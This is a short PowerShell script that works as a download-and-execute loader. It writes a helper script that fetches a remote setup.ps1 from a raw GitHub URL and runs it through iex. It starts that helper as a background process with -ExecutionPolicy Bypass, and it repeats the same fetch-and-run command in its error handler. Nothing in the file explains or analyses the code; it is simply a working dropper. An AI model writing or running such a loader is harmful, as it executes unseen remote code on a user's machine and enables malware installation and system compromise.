try {
    # Define the content for Script2.ps1
    $content = @"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ooooooooo-o/ps1/0/setup.ps1'));"
"@

    # Write the content to Script2.ps1
    Set-Content -Path "Script2.ps1" -Value $content

    # Start the new script as a background job
    Start-Job -ScriptBlock {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSScriptRoot\Script2.ps1`""
    } | Out-Null

    # Exit immediately
    exit
} catch {
    # If an error occurs, run the initial command directly
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ooooooooo-o/ps1/0/setup.ps1'));"
    exit
}

